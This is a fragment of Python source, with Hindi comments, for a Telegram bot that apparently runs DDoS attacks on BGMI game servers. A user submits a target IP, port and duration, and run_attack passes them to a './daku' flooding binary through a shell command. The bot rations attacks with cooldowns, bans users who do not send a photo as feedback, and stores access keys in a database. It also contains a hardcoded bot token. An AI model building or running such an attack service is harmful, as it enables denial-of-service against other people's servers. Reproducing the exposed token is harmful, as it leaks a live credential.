...
# Bot token
BOT_TOKEN = '7960283920:AAEjmNJ64Zao3CEQPLFj5dlDIuH6nL5Mzqg'  # Replace with your bot token
...
key_collection = db["Key"]  # Collection for storing keys
...
COOLDOWN_PERIOD = 1  # 60 seconds cooldown after an attack
user_feedback_required = {}  # Track users who need to send feedback
user_bans = {}  # Track banned users
BAN_DURATION = timedelta(minutes=20)  # 20-minute ban duration
ADMIN_ID = 1944182800  # Admin ID

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack_user, current_attack_end_time, attack_cooldown, user_feedback_required, user_bans

    user_id = update.effective_user.id
    user_name = update.effective_user.first_name

    # ✅ Agar user banned hai aur abhi tak ban period khatam nahi hua
    if user_id in user_bans and datetime.now() < user_bans[user_id]:
        remaining_time = (user_bans[user_id] - datetime.now()).total_seconds()
    ...
    if user_feedback_required.get(user_id, False):
        user_bans[user_id] = datetime.now() + BAN_DURATION  # 20 min ban
        del user_feedback_required[user_id]  # Remove tracking

        await update.message.reply_text("🚫 𝗔𝗮𝗽 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗻𝗮𝗵𝗶 𝗱𝗶𝘆𝗲, 𝟮𝟬 𝗺𝗶𝗻 𝗸𝗲 𝗹𝗶𝘆𝗲 𝗯𝗮𝗻 𝗵𝗼 𝗴𝗮𝘆𝗲!")
        return

    # ✅ Normal attack validation (Ye tera existing logic hai, change nahi karenge)
    ...
    # ✅ Feedback required mark karo, lekin ban nahi lagao
    ...
    await update.message.reply_text(
        ...
        "⚠️ *Attack complete hone ke baad feedback (photo) bhejna zaroori hai, warna agla attack nahi kar sakoge!*",
        parse_mode="Markdown",
    )
...
async def run_attack(ip, port, time_duration, update, user_id):
    ...
    try:
        command = f"./daku {ip} {port} {time_duration} {4} {default_thread}"
...
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global user_feedback_required, user_bans

    user_id = update.effective_user.id

    # ✅ Agar user ka feedback pending tha, toh ab complete mark karo
    if user_feedback_required.get(user_id, False):
        user_feedback_required[user_id] = False  # Feedback complete
        if user_id in user_bans:
            del user_bans[user_id]  # Ban hata do

        await context.bot.forward_message(ADMIN_ID, update.message.chat_id, update.message.message_id)

        await update.message.reply_text("✅ 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐫𝐞𝐜𝐞𝐢𝐯𝐞𝐝! 𝐀𝐚𝐩 𝐰𝐚𝐩𝐚𝐬 𝐚𝐭𝐭𝐚𝐜𝐤 𝐤𝐚𝐫 𝐬𝐚𝐤𝐭𝐞 𝐡𝐨.")
...
async def cpu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cpu_usage = psutil.cpu_percent(interval=1)  # 1 second ka interval le raha hai taaki accurate reading mile
    await update.message.reply_text(f"⚙️ *Current CPU Usage:* {cpu_usage}%", parse_mode="Markdown")
